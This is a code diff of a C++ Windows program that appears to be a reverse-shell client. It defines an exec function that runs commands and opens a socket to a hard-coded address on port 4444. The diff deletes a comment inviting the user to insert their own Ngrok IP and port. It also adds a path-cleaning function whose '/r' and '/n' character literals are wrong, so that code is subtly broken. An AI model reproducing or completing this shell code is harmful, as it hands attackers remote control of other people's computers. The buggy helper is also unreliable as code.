@@ -11,6 +11,17 @@
 #include <fstream>     
 #pragma comment(lib, "ws2_32.lib")
 
+void clean_path(char* path){
+for(int i =0;path[i];i++){
+if (path[i] == '/r' || path[i] == '/n'){
+path[i] = '\0'; // add null character hey hey hey
+break;
+}
+
+}
+}
+
+
 std::string exec(const char* komut) {
     std::array<char, 128> buffer;
     std::string result;
@@ -34,7 +45,7 @@ int main() {
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(4444);
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.255.133");//Put Your Ngrok Ip an Port 
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.255.133");
 
     connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
 
